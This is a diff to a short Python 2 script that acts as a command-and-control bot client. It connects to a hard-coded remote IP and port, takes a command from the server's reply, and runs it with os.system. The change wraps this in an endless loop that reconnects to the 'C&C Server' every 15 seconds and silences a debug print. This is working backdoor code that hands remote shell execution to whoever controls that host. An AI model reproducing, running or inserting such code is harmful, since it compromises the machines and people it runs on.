@@ -1,5 +1,6 @@
 import socket
 import os
+import time
 
 HOST = '140.114.71.175'    # The remote host
 PORT = 5000                # The same port as used by the server
@@ -8,7 +9,7 @@ GET = '/'
 
 def getcmd(string):
     response = string.split('\r\n')
-    print 'Received:', response
+    # print 'Received:', response
     return response[-1].strip('\n').rstrip('"').lstrip('"')
 
 
@@ -30,4 +31,8 @@ def main():
     os.system(command)
 
 if __name__ == "__main__":
-    main()
+    while True:
+        print "=== Connect to C&C Server ==="
+        main()
+        print "Wait for 15 seconds..."
+        time.sleep(15)
